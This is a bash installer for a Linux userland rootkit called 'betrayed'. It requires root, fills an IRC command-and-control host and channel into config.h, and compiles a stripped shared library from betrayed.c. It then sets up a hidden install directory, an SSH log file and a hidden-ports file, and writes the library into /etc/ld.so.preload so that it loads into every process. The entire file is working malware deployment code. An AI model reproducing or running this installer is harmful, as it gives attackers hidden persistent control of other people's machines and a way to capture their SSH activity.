#!/bin/bash

# nothing to really see here
[ $(id -u) != 0 ] && [ -z $COMPILE_ONLY ] && exit

# get meeeee config
# auto.sh lets you skip this stuff fast
if [ -z $HOST ]; then
    read -p "IRC host to connect to: "
    if [ -z $REPLY ]; then
        exit
    else
        HOST=$REPLY
    fi
fi
if [ -z $CHANNEL ]; then
    read -p "Channel to join (include #s): "
    if [ -z $REPLY ]; then
        exit
    else
        CHANNEL=$REPLY
    fi
fi
[ -z $NICK ] && NICK="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1)"
[ -z $MGID ] && MGID=$(cat /dev/urandom | tr -dc '1-9' | fold -w 6 | head -n 1)
[ -z $INSTALL_DIR ] && INSTALL_DIR="/lib/betrayed.$NICK"
[ -z $SSH_LOGS ] && SSH_LOGS="$INSTALL_DIR/betrayed_ssh"
[ -z $HIDDEN_PORTS ] && HIDDEN_PORTS="$INSTALL_DIR/hidden_ports"
[ -z $MVAR ] && MVAR="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1)"

# config meeeee
sed -i "s:??HOST??:$HOST:" config.h
sed -i "s:??CHANNEL??:$CHANNEL:" config.h
sed -i "s:??NICK??:$NICK:" config.h
sed -i "s:??MGID??:$MGID:" config.h
sed -i "s:??INSTALL_DIR??:$INSTALL_DIR:" config.h
sed -i "s:??SSH_LOGS??:$SSH_LOGS:" config.h

# compile meeeeee
cf="betrayed.c"
so="betrayed.so.`uname -m`"
rm -rf *.so.*
LFLAGS="-ldl"
WFLAGS="-Wall"
FFLAGS="-fomit-frame-pointer -fPIC"
gcc -std=gnu99 $cf -O0 $WFLAGS $FFLAGS -shared $LFLAGS -Wl,--build-id=none -o $so
strip $so || { echo "couldn't strip lib, exiting"; exit; }
cp config.bak.h config.h

[ ! -z $COMPILE_ONLY ] && exit

# setup meeee
# no magic environment variable this time 'round so
# we gotta set it all up before preloading the lib.
mkdir -p $INSTALL_DIR && chown 0:$MGID $INSTALL_DIR
if [ -d $INSTALL_DIR ]; then
    mv $so $INSTALL_DIR/$so && chown 0:$MGID $INSTALL_DIR/$so
    touch $SSH_LOGS && chmod 666 $SSH_LOGS && chown 0:$MGID $SSH_LOGS
    touch $HIDDEN_PORTS && chown 0:$MGID $HIDDEN_PORTS
    touch /etc/ld.so.preload && chown 0:$MGID /etc/ld.so.preload
    echo $INSTALL_DIR/$so > /etc/ld.so.preload && echo "we pimpin"
    cat /dev/null # start a process so we can fork straight away
fi
